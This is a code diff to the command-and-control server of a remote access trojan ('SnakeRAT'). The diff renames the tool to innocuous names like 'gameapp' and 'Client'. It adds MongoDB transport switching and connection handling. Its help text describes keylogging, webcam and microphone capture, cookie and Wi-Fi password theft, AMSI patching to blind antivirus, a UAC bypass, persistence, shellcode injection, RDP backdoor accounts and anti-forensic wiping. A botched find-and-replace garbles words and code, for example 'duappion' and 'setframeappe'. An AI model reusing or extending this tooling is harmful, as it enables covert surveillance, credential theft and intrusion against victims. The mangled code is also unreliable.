@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Advanced C2 Server - Pro Series
-Version: 5.0 CLI Elite (Restoration)
+Advanced Client  Server - Pro Series
+Version: 5.0 CLI Elite (Restoappion)
 """
 
 import socket
@@ -54,10 +54,10 @@ _load_dotenv()
 class ServerConfig:
     host: str = '0.0.0.0'
     port: int = 4444
-    encryption_key: str = 'AdvancedSnakeRAT_2024_CrossPlatform'
+    encryption_key: str = 'Advancedgameapp_2024_CrossPlatform'
     loot_dir: str = 'loot'
-    database: str = 'data/c2.db'
-    log_file: str = 'c2_server.log'
+    database: str = 'data/Client .db'
+    log_file: str = 'Client _server.log'
     debug: bool = False
     heartbeat_timeout: int = 120
 
@@ -121,15 +121,83 @@ class DatabaseManager:
             self.db = self.client.get_database('c2_database')
             self.use_mongo = True
             self._init_mongo()
-            # Close TCP listener so the OS stops accepting connections at kernel level
             if server is not None:
+                # 1. Gracefully instruct all currently connected TCP clients to switch to MongoDB mode
+                with server.client_lock:
+                    active_cids = [cid for cid, c in server.clients.items() if not c.get('mongo_transport') and c.get('sock')]
+                if active_cids:
+                    server.logger.info(f"Instructing {len(active_cids)} TCP client(s) to migrate to MongoDB mode...")
+                    for cid in active_cids:
+                        try:
+                            payload = {'id': os.urandom(4).hex(), 'type': 'dbmode_client', 'params': {'mode': 'mongo'}}
+                            c = server.clients.get(cid)
+                            if c and c.get('sock'):
+                                server._send_raw(c['sock'], server.crypto.encrypt_json(payload))
+                        except Exception:
+                            pass
+                    time.sleep(0.5)
+
+                # 2. Close TCP listener so the OS stops accepting connections at kernel level
                 server._close_tcp_listener()
+                with server.client_lock:
+                    for cid, client in list(server.clients.items()):
+                        if not client.get('mongo_transport') and client.get('sock'):
+                            try:
+                                client['sock'].close()
+                            except Exception:
+                                pass
         else:
-            self.use_mongo = False
-            self._init_sqlite()
-            # Re-open TCP listener so clients can connect again
+            # Switching from Mongo to SQLite/Normal
+            # 1. First re-open TCP listener so clients can immediately reconnect
             if server is not None:
                 server._open_tcp_listener()
+
+            # 2. If Mongo connection was active, notify all Mongo-polling clients to switch back to TCP
+            if self.use_mongo and hasattr(self, 'db') and self.db is not None:
+                try:
+                    now_utc = datetime.datetime.now(datetime.timezone.utc).isoformat()
+                    # Broadcast command in MongoDB commands collection
+                    self.db.commands.insert_one({
+                        "id": os.urandom(4).hex(),
+                        "client_id": "*",
+                        "command_type": "command",
+                        "command_name": "dbmode_client",
+                        "parameters": json.dumps({"mode": "normal"}),
+                        "status": "pending",
+                        "created_at": now_utc,
+                        "updated_at": now_utc,
+                        "is_active": 0
+                    })
+                    # Also update handshake collection to signal switch_to_tcp
+                    for hs in self.db.mongo_handshake.find({}):
+                        cid = hs.get('client_id')
+                        if cid:
+                            self.db.commands.insert_one({
+                                "id": os.urandom(4).hex(),
+                                "client_id": cid,
+                                "command_type": "command",
+                                "command_name": "dbmode_client",
+                                "parameters": json.dumps({"mode": "normal"}),
+                                "status": "pending",
+                                "created_at": now_utc,
+                                "updated_at": now_utc,
+                                "is_active": 0
+                            })
+                            self.db.mongo_handshake.update_one(
+                                {"client_id": cid},
+                                {"$set": {"status": "switch_to_tcp", "timestamp": now_utc}}
+                            )
+                except Exception as e:
+                    if server:
+                        server.logger.warning(f"Error notifying clients in Mongo: {e}")
+
+            self.use_mongo = False
+            self._init_sqlite()
+            if server is not None:
+                with server.client_lock:
+                    stale = [cid for cid, c in server.clients.items() if c.get('mongo_transport')]
+                for cid in stale:
+                    server._remove_client(cid)
 
 
     def _init_sqlite(self):
@@ -179,7 +247,7 @@ class DatabaseManager:
             )
         ''')
         
-        # Simple Migrations for existing databases
+        # Simple Migappions for existing databases
         try: c.execute("ALTER TABLE loot ADD COLUMN size INTEGER DEFAULT 0")
         except: pass
         try: c.execute("ALTER TABLE system_info ADD COLUMN network_in FLOAT DEFAULT 0")
@@ -368,6 +436,10 @@ class AdvancedC2Server:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            try:
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+            except (AttributeError, OSError):
+                pass  # SO_REUSEPORT not available on all platforms
             s.bind((self.config.host, self.config.port))
             s.listen(100)
             s.settimeout(0.01)
@@ -501,9 +573,9 @@ class AdvancedC2Server:
             self.logger.info("Discovery responder active on UDP 4445")
             while self.running:
                 data, addr = discovery_sock.recvfrom(1024)
-                if data == b"SNAKERAT_DISCOVER":
+                if data == b"gameapp_DISCOVER":
                     self.logger.debug(f"Discovery request from {addr[0]}")
-                    discovery_sock.sendto(b"SNAKERAT_OFFER", addr)
+                    discovery_sock.sendto(b"gameapp_OFFER", addr)
         except Exception as e:
             self.logger.error(f"Discovery responder error: {e}")
         finally:
@@ -651,7 +723,7 @@ class AdvancedC2Server:
         except Exception as e:
             self.logger.error(f"Webcam render error: {e}")
 
-    def _start_recording(self, source: str, duration: int = 0) -> str:
+    def _start_recording(self, source: str, duappion: int = 0) -> str:
         """Start recording a stream. source: 'stream' | 'webcam'. Returns status msg."""
         if not self._cv2_available:
             return 'cv2 not available — cannot record'
@@ -674,9 +746,9 @@ class AdvancedC2Server:
             self._webcam_recording   = True
             msg = f'Webcam recording started → {self._webcam_rec_path}'
 
-        if duration > 0:
-            threading.Timer(duration, lambda: self._stop_recording(source)).start()
-            msg += f' (Timed: {duration}s)'
+        if duappion > 0:
+            threading.Timer(duappion, lambda: self._stop_recording(source)).start()
+            msg += f' (Timed: {duappion}s)'
         return msg
 
     def _stop_recording(self, source: str) -> str:
@@ -730,7 +802,7 @@ class AdvancedC2Server:
             self._webcam_rec_path = ''
             return msg
 
-    def _start_audio_recording(self, duration: int = 0) -> str:
+    def _start_audio_recording(self, duappion: int = 0) -> str:
         """Start recording the live audio stream to a .wav file."""
         if self._audio_recording:
             return f'Audio recording already active → {self._audio_rec_path}'
@@ -745,13 +817,13 @@ class AdvancedC2Server:
             self._audio_wave_file = wave.open(self._audio_rec_path, 'wb')
             self._audio_wave_file.setnchannels(1)
             self._audio_wave_file.setsampwidth(2) # 16-bit
-            self._audio_wave_file.setframerate(44100)
+            self._audio_wave_file.setframeappe(44100)
             self._audio_recording = True
             
             msg = f'Audio recording started → {self._audio_rec_path}'
-            if duration > 0:
-                threading.Timer(duration, self._stop_audio_recording).start()
-                msg += f' (Timed: {duration}s)'
+            if duappion > 0:
+                threading.Timer(duappion, self._stop_audio_recording).start()
+                msg += f' (Timed: {duappion}s)'
             return msg
         except Exception as e:
             self.logger.error(f"Failed to start audio recording: {e}")
@@ -774,6 +846,15 @@ class AdvancedC2Server:
     def _handle_client(self, sock, addr):
         cid = None
         try:
+            # Enable TCP keepalive so stale connections are detected quickly
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            try:
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 30)   # start after 30s idle
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)  # probe every 10s
+                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)     # drop after 5 missed
+            except (AttributeError, OSError):
+                pass  # Not available on all platforms
+            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # disable Nagle
             sock.settimeout(self.config.heartbeat_timeout)
             # Direct Authentication (Original Static Key)
             raw_init = self._recv_raw(sock)
@@ -1068,7 +1149,7 @@ class AdvancedC2Server:
                         stream = p.open(
                             format=pyaudio.paInt16,
                             channels=1,
-                            rate=44100,
+                            appe=44100,
                             output=True,
                             frames_per_buffer=1024
                         )
@@ -1260,7 +1341,7 @@ class AdvancedC2Server:
                 self.logger.error(f"Error sending command over socket: {e}")
 
     def _poll_mongodb_results(self):
-        """Poll MongoDB for completed/failed command results to display to the console operator"""
+        """Poll MongoDB for completed/failed command results to display to the console opeappor"""
         # Internal server commands whose results should never be shown on the panel
         _SILENT_CMDS = {'sync_tasks', 'dbmode_client'}
         while self.running:
@@ -1313,61 +1394,83 @@ class AdvancedC2Server:
                             if getattr(self.parser, 'shell_mode', False):
                                 print(f"{Fore.GREEN}SHELL@{self.selected_client or 'all'}{Style.RESET_ALL} > ", end='', flush=True)
                             else:
-                                print(f"{Fore.GREEN}C2@{self.selected_client or 'all'}{Style.RESET_ALL} > ", end='', flush=True)
+                                print(f"{Fore.GREEN}Client @{self.selected_client or 'all'}{Style.RESET_ALL} > ", end='', flush=True)
             except Exception as e:
                 pass
             time.sleep(0.2)
 
     def _poll_mongodb_handshakes(self):
         """Poll MongoDB for new clients waiting for connection via DB-only transport"""
+        _STALE_SECONDS = 300  # generous window to prevent clock skew disconnects
         while self.running:
             try:
                 if self.db.use_mongo and hasattr(self.db, 'db'):
-                    # Find clients that are waiting OR were already connected in a previous
-                    # server session (status=server_connected but not in self.clients).
-                    # The second case covers a server restart scenario.
                     waiting_clients = list(self.db.db.mongo_handshake.find({
                         "status": {"$in": ["client_waiting", "server_connected"]}
                     }))
+                    now_utc = datetime.datetime.now(datetime.timezone.utc)
+                    now_iso = now_utc.isoformat()
                     for ws in waiting_clients:
                         cid = ws.get('client_id')
                         info = ws.get('info', {})
+                        status = ws.get('status')
+                        client_ip = info.get('public_ip') or info.get('ip_address') or '127.0.0.1'
+
+                        # Only prune staleness for previously connected clients whose heartbeat stopped
+                        if status == 'server_connected':
+                            ts_str = ws.get('timestamp', '')
+                            try:
+                                parsed_ts = datetime.datetime.fromisoformat(ts_str)
+                                if parsed_ts.tzinfo is None:
+                                    parsed_ts = parsed_ts.replace(tzinfo=datetime.timezone.utc)
+                                age = abs((now_utc - parsed_ts).total_seconds())
+                                if age > _STALE_SECONDS:
+                                    self.db.db.mongo_handshake.update_one(
+                                        {"client_id": cid},
+                                        {"$set": {"status": "stale", "timestamp": now_iso}}
+                                    )
+                                    with self.client_lock:
+                                        if cid in self.clients and self.clients[cid].get('mongo_transport'):
+                                            del self.clients[cid]
+                                            self.logger.warning(f"Removed stale mongo client: {cid}")
+                                    continue
+                            except Exception:
+                                pass
 
                         with self.client_lock:
                             already_registered = cid in self.clients
 
                         if already_registered:
-                            # Nothing to do — just make sure the handshake status is server_connected
-                            if ws.get('status') != 'server_connected':
+                            if status != 'server_connected':
                                 self.db.db.mongo_handshake.update_one(
                                     {"client_id": cid},
                                     {"$set": {
                                         "status": "server_connected",
-                                        "timestamp": datetime.datetime.now().isoformat()
+                                        "timestamp": now_iso
                                     }}
                                 )
                             continue
 
-                        # New or re-connecting client — acknowledge and register
+                        # Acknowledge immediately and register
                         self.db.db.mongo_handshake.update_one(
                             {"client_id": cid},
                             {"$set": {
                                 "status": "server_connected",
-                                "timestamp": datetime.datetime.now().isoformat()
+                                "timestamp": now_iso
                             }}
                         )
                         with self.client_lock:
                             self.clients[cid] = {
                                 'sock': None,
-                                'addr': ('0.0.0.0', 0),
+                                'addr': (client_ip, 0),
                                 'info': info,
                                 'mongo_transport': True
                             }
                         self.logger.success(f"Session Established (MongoDB DB-only): {cid}")
-                        self._update_db(cid, '0.0.0.0', info)
+                        self._update_db(cid, client_ip, info)
             except Exception as e:
-                pass
-            time.sleep(2)
+                self.logger.warning(f"_poll_mongodb_handshakes error: {e}")
+            time.sleep(0.5)
 
     def _poll_mongodb_loot(self):
         """Poll MongoDB loot collection for files sent by clients and save them to disk.
@@ -1442,7 +1545,7 @@ class AdvancedC2Server:
                 if getattr(self.parser, 'shell_mode', False):
                     prompt = f"{Fore.GREEN}SHELL@{self.selected_client or 'all'}{Style.RESET_ALL} > "
                 else:
-                    prompt = f"{Fore.GREEN}C2@{self.selected_client or 'all'}{Style.RESET_ALL} > "
+                    prompt = f"{Fore.GREEN}Client @{self.selected_client or 'all'}{Style.RESET_ALL} > "
                 line = input(prompt).strip()
                 if line: self.parser.parse(line)
             except (EOFError, KeyboardInterrupt): break
@@ -1538,7 +1641,7 @@ class CommandParser:
             # --- Surveillance ---
             elif cmd == 'screenshot': self.server.send_command(targets, 'screenshot', {'height': int(args[0]) if args else 0})
             elif cmd == 'webcam': self.server.send_command(targets, 'webcam', {'resolution': args[0] if args else '640x480'})
-            elif cmd == 'mic': self.server.send_command(targets, 'microphone', {'duration': int(args[0]) if args else 10})
+            elif cmd == 'mic': self.server.send_command(targets, 'microphone', {'duappion': int(args[0]) if args else 10})
             elif cmd == 'audio_stream': self.server.send_command(targets, 'audio_stream', {'action': args[0] if args else 'start'})
             elif cmd == 'keylog': self.server.send_command(targets, 'keylog', {'action': args[0] if args else 'dump'})
             elif cmd == 'clip': self.server.send_command(targets, 'clipboard', {'action': args[0] if args else 'get', 'text': ' '.join(args[1:]) if len(args)>1 else ''})
@@ -1550,8 +1653,8 @@ class CommandParser:
             elif cmd == 'wifi': self.server.send_command(targets, 'wifi_passwords')
             elif cmd == 'chromelevator': self.server.send_command(targets, 'chromelevator')
             
-            # --- Persistence / Privilege ---
-            elif cmd == 'persist': self.server.send_command(targets, 'persistence')
+            # --- living / Privilege ---
+            elif cmd == 'persist': self.server.send_command(targets, 'living')
             elif cmd == 'unpersist': self.server.send_command(targets, 'unpersist')
             elif cmd == 'elevate': self.server.send_command(targets, 'elevate')
             elif cmd == 'amsi': self.server.send_command(targets, 'amsi_bypass')
@@ -1705,11 +1808,11 @@ class CommandParser:
         source = 'stream' if cmd == 'recstream' else ('webcam' if cmd == 'recwcam' else 'audio')
         action = args[0].lower() if args else 'start'
         if action == 'start':
-            duration = int(args[1]) if len(args) > 1 else 0
+            duappion = int(args[1]) if len(args) > 1 else 0
             if source == 'audio':
-                msg = self.server._start_audio_recording(duration)
+                msg = self.server._start_audio_recording(duappion)
             else:
-                msg = self.server._start_recording(source, duration)
+                msg = self.server._start_recording(source, duappion)
         elif action == 'stop':
             if source == 'audio':
                 msg = self.server._stop_audio_recording()
@@ -1765,7 +1868,7 @@ class CommandParser:
         Bl = Fore.BLUE
         print(fr"""
 {C}{'='*70}{W}
-  SnakeRAT C2 Elite  |  Full Command Reference  |  type 'help' to reprint
+  gameapp Client  Elite  |  Full Command Reference  |  type 'help' to reprint
 {C}{'='*70}{W}
 
 {Y}╔══════════════════════════════════════╗
@@ -1775,7 +1878,7 @@ class CommandParser:
   {G}select <id>{W}          Focus all subsequent commands on this client ID
   {G}deselect{W}             Go back to broadcast mode (all clients)
   {G}clear{W}                Clear the terminal screen
-  {G}exit{W}                 Shut down the C2 server entirely
+  {G}exit{W}                 Shut down the Client  server entirely
   {G}dbmode <mongo|normal>{W} Switch database dynamically (MongoDB Atlas vs SQLite)
   {G}dbmode{W}               (no args) Print the current database mode
   {G}dbmode_client <normal|mongo>{W}   Tell the connected client to switch its transport mode
@@ -1812,17 +1915,17 @@ class CommandParser:
                        Ex: script ./payload.py
   {G}amsi{W}                 Patch AMSI in memory — blinds Windows Defender/EDR
                        Patches AmsiScanBuffer to return SCAN_RESULT_CLEAN.
-                       Run before any AV-detected operations.  [Admin required]
+                       Run before any AV-detected opeappions.  [Admin required]
 
 {Y}╔══════════════════════════════════════╗
-║        FILE OPERATIONS               ║
+║        FILE OPEappIONS               ║
 ╚══════════════════════════════════════╝{W}
   {G}browse <path>{W}        List files/folders at a remote path with sizes & dates
                        Ex: browse C:\\Users\\target\\Desktop
   {G}download <path>{W}      Pull any file from the victim to loot/file/ on the server
                        Ex: download C:\\Users\\target\\secret.docx
   {G}upload <local_file>{W}  Push a local file to the victim's current working directory
-                       Ex: upload ./malware.exe
+                       Ex: upload ./preicious app .exe
   {G}read <path>{W}          Read the contents of a remote file
                        Ex: read C:\Users\target\Documents\pass.txt
   {G}write <path> <text>{W}  Create/overwrite a file with given text content
@@ -1849,7 +1952,7 @@ class CommandParser:
                        Runs in background — captures ALL keystrokes with context.
                        Output saved to loot/keylog/
   {G}keylog status{W}        Check if the keylogger is running + current buffer size
-  {G}keylog clear{W}         Wipe the in-memory buffer without exfiltrating it
+  {G}keylog clear{W}         Wipe the in-memory buffer without exfiltapping it
   {G}clip get{W}             Steal the current clipboard contents (text, passwords, etc.)
   {G}clip set <text>{W}      Overwrite the victim's clipboard with custom text
                        Ex: clip set "http://phishing.site"
@@ -1871,7 +1974,7 @@ class CommandParser:
                        Ex: cookies instagram.com
   {G}cookies live <url>{W}   Extract cookies via Chrome DevTools Protocol (CDP) — bypasses
                        App-Bound Encryption (v20+). Opens headless browser with victim's
-                       profile shadow-copied. Best for Instagram/Facebook session cookies.
+                       profile darksoul-copied. Best for Instagram/Facebook session cookies.
                        Ex: cookies live https://www.instagram.com
   {G}history [limit]{W}      Dump browser history from Chrome, Edge, Brave, Opera, Opera GX.
                        Optionally specify history entries limit (default 1000).
@@ -1932,25 +2035,25 @@ class CommandParser:
 ║        PRIVILEGE & EVASION           ║
 ╚══════════════════════════════════════╝{W}
   {G}elevate{W}              Request UAC elevation (triggers Windows UAC prompt).
-                       If accepted, re-spawns the RAT as Administrator.
+                       If accepted, re-spawns the app as Administappor.
   {G}uac <program>{W}        Silent UAC bypass via fodhelper.exe (no UAC prompt shown).
-                       Runs the given program as Administrator without confirmation.
+                       Runs the given program as Administappor without confirmation.
                        Ex: uac "C:\\Temp\\payload.exe"
   {G}amsi{W}                 Patch AMSI in ntdll — makes AV/EDR blind to subsequent ops.
-  {G}persist{W}              Install multi-vector persistence:
+  {G}persist{W}              Install multi-vector living:
                        Windows: Registry Run key + Startup VBS + Scheduled Task
                        Linux: systemd user service + XDG autostart .desktop file
                        macOS: LaunchAgent plist
-                       Also launches a shadow copy that survives parent process death.
-  {G}unpersist{W}            Remove all persistence mechanisms and delete the shadow copy.
-  {G}wmi <command>{W}        Install WMI Event Subscription persistence (stealthiest method).
+                       Also launches a darksoul copy that survives parent process death.
+  {G}unpersist{W}            Remove all living mechanisms and delete the darksoul copy.
+  {G}wmi <command>{W}        Install WMI Event Subscription living (stealthiest method).
   {G}inject <pid> <file>{W}  Inject binary shellcode from a local file into a remote process.
   {G}hollow <exe> <file>{W}  Spawn a suspended process and hollow it with your shellcode.
                        Triggers hourly via Win32_LocalTime WMI event. [Admin required]
                        Ex: wmi "C:\\Windows\\System32\\WindowsPowerShell\\...\\powershell.exe"
   {G}clean{W}                Wipe forensic evidence: PowerShell history, Recent files,
                        bash/zsh history, Python history, temp files.
-   {G}destroy{W}             Complete self-destruction of the RAT (Cleanup + Delete)
+   {G}destroy{W}             Complete self-destruction of the app (Cleanup + Delete)
    {G}panic{W}               Emergency Anti-Forensic Wipe (Cleanup + BSOD)
   {G}abort [id]{W}           Kill a running task by ID, or abort all active tasks.
                        Ex: abort  or  abort a1b2c3d4
@@ -2002,7 +2105,7 @@ class CommandParser:
   {G}wcam stop{W}            Stop the stream (also press 'q' in the OpenCV window)
 
   Notes:
-  • A separate OpenCV window titled "Webcam Stream - <id>" opens on this server
+  • A sepaappe OpenCV window titled "Webcam Stream - <id>" opens on this server
   • Press 'q' in the window to send a remote stop command automatically
   • Uses cv2.VideoCapture(0) — only captures the first/default camera
   • Works cross-platform: Windows (CAP_DSHOW), Linux/macOS (CAP_ANY)
@@ -2021,7 +2124,7 @@ class CommandParser:
   {G}wlog start <sec>{W}     Start with custom interval in seconds (float allowed)
                        Ex: wlog start 0.5   (poll every 500ms for high fidelity)
   {G}wlog stop{W}            Stop the background polling thread gracefully
-  {G}wlog dump{W}            Exfiltrate the entire buffer as a timestamped .txt file
+  {G}wlog dump{W}            Exfiltappe the entire buffer as a timestamped .txt file
                        Saved to loot/window_log/ on this server
                        Ex output line:  [2026-03-21 14:22:10] Google Chrome - Gmail
   {G}wlog clear{W}           Wipe the in-memory buffer without sending it
@@ -2039,7 +2142,7 @@ class CommandParser:
     1. Writing fDenyTSConnections = 0 to HKLM\\SYSTEM\\...\\Terminal Server
     2. Disabling NLA (Network Level Auth) so any RDP client can connect
     3. Adding a Windows Firewall rule: allow inbound TCP 3389 from any profile
-    4. Optionally creating a backdoor local Administrator account
+    4. Optionally creating a backdoor local Administappor account
 
   After running, you can immediately connect with:
     mstsc /v:<victim_ip>:3389   (Windows Remote Desktop)
@@ -2052,7 +2155,7 @@ class CommandParser:
   {G}rdp adduser{W}          Enable RDP + create local admin: svcadmin / P@ssw0rd!
   {G}rdp adduser <u> <p>{W}  Enable RDP + create custom backdoor account
                        Ex: rdp adduser hacker R00t!2024
-                       Creates the user, adds to Administrators group,
+                       Creates the user, adds to Administappors group,
                        and adds to Remote Desktop Users group.
 
   Notes:
@@ -2064,7 +2167,7 @@ class CommandParser:
 
 {M}▶ SERVER-SIDE RECORDING  (recstream / recwcam){W}
   Enables recording of the live screen or webcam streams directly to the
-  server's disk. This feature is processed entirely on the C2 server,
+  server's disk. This feature is processed entirely on the Client  server,
   meaning it uses NO additional bandwidth or CPU on the victim's machine.
   It simply intercepts the frames already being sent for live display.
 
